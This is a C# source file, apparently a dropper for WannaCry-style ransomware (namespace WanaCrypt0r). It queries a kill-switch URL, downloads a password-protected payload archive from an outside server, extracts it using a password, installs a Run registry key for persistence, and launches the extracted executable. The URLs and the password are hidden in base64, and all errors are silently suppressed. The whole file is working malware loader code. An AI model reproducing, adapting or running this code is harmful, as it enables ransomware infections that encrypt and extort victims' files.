using Ionic.Zip;
using Microsoft.Win32;
using Newtonsoft.Json.Linq;
using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Net;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace WanaCrypt0r
{
    class Program
    {
        static void Main(string[] args)
        {
            try
            {
                WebClient webClient = new WebClient();
                
                // Kill-Switch 확인
                string jsonData = webClient.DownloadString(
                    Encoding.UTF8.GetString(
                        Convert.FromBase64String("aHR0cHM6Ly9yaHlhLW5ldHdvcmsua3JvLmtyL1JoeWFOZXR3b3JrL3dhbmFjcnlwdDByX21hbmFnZXI/bW9kZT00")
                        )
                    );
                JObject jObject = JObject.Parse(jsonData);
                if (jObject.ContainsKey("result") && jObject.ContainsKey("message"))
                {
                    if ((bool)jObject["message"])
                    {
                        // Web Client 종료
                        webClient.Dispose();

                        // 프로그램 종료
                        Environment.Exit(0);
                    }
                }

                // 압축 파일 다운로드
                webClient.DownloadFile(
                    Encoding.UTF8.GetString(
                        Convert.FromBase64String("aHR0cHM6Ly9yaHlhLW5ldHdvcmsua3JvLmtyL1JoeWFOZXR3b3JrL3dhbmFjcnlwdDByX21hbmFnZXI/bW9kZT01")
                        ),
                    "d.wnry");
                // Web Client 종료
                webClient.Dispose();

                // 압축 파일 압축 해제
                using (ZipFile zip = new ZipFile("d.wnry"))
                {
                    zip.Password = Encoding.UTF8.GetString(Convert.FromBase64String("d25jcnlAWWhjY0tTSkZFMkpoa0pK"));
                    zip.ExtractAll(System.Environment.CurrentDirectory);
                }

                // 레지스트리 등록
                string name = "-?RhyaName:@WanaDecryptor@.exe";
                string path = string.Concat("-?RhyaPath:", System.Environment.CurrentDirectory.Replace(" ", "<SPC>"));
                RegistryKey registryKey = Microsoft.Win32.Registry.CurrentUser.OpenSubKey(@"SOFTWARE\Microsoft\Windows\CurrentVersion\Run", true);
                registryKey.SetValue("WanaCrypt0r", string.Format("\"{0}\" {1} {2}", System.IO.Path.Combine(System.Environment.CurrentDirectory, "rhyaLauncher.exe"), name, path));

                // 파일 실행
                Process.Start("tasksche.exe");
            }
            catch (Exception) { }
        }
    }
}
